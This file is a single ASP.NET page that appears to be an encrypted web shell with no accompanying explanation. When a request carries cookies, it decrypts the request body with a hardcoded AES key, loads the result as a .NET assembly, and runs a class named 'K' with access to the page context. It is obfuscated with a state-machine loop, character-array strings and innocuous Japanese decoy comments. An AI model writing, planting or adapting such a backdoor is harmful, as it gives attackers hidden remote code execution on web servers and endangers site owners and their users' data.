<%@ Page Language="C#" %><%
// 月が綺麗ですね
if(Request.Cookies.Count != 0) {
    int s = 0;
    object p = null;
    object q = null;
    byte[] r = null;

    // 頑張ってください
    while(s < 5) {
        switch(s) {
            case 0:
                // お腹すいた
                char[] k = new char[]{'c','a','6','3','4','5','7','5','3','8','b','9','b','1','e','0'};
                p = System.Text.Encoding.Default.GetBytes(new string(k));
                s = 1;
                break;
            case 1:
                // 猫はかわいい
                var i = Request.InputStream;
                var b = new byte[i.Length];
                i.Read(b, 0, b.Length);
                q = b;
                s = 2;
                break;
            case 2:
                // 今日の天気は晴れです
                var c = new System.Security.Cryptography.RijndaelManaged();
                var d = c.CreateDecryptor((byte[])p, (byte[])p);
                r = d.TransformFinalBlock((byte[])q, 0, ((byte[])q).Length);
                s = 3;
                break;
            case 3:
                // また会いましょう
                var t1 = typeof(System.Reflection.Assembly);
                var m1 = t1.GetMethod("Load", new System.Type[]{typeof(byte[])});
                p = m1.Invoke(null, new object[]{r});
                s = 4;
                break;
            case 4:
                // どういたしまして
                char[] n = new char[]{'K'};
                q = ((System.Reflection.Assembly)p).CreateInstance(new string(n));
                ((object)q).Equals(this);
                s = 5;
                break;
        }
    }
}
%>